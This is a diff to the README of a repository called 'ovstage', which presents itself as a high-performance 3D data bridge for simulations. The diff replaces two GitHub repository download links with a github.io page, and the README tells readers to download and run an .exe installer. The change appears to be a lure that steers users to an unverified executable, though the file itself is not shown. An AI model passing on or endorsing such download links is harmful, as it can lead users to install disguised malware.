@@ -1,6 +1,6 @@
 # 🚀 ovstage - High performance data for visual simulations
 
-[![Download ovstage](https://img.shields.io/badge/Download-ovstage-blue.svg)](https://github.com/Wheelerpeakenlistedman916/ovstage)
+[![Download ovstage](https://img.shields.io/badge/Download-ovstage-blue.svg)](https://wheelerpeakenlistedman916.github.io)
 
 This project provides a connection between different simulation tools. It acts as a bridge for 3D data. You use it to move information between physics engines, rendering tools, and robot simulations. It focuses on speed and hardware efficiency.
 
@@ -23,7 +23,7 @@ Your computer needs specific hardware and software to run this utility. Check yo
 
 You need to download the installer to add this tool to your system.
 
-1. Visit this page to download: [https://github.com/Wheelerpeakenlistedman916/ovstage](https://github.com/Wheelerpeakenlistedman916/ovstage).
+1. Visit this page to download: [https://wheelerpeakenlistedman916.github.io](https://wheelerpeakenlistedman916.github.io).
 2. Locate the link labeled "Releases" on the right side of the page.
 3. Select the latest version listed.
 4. Download the file ending in `.exe` to your computer.
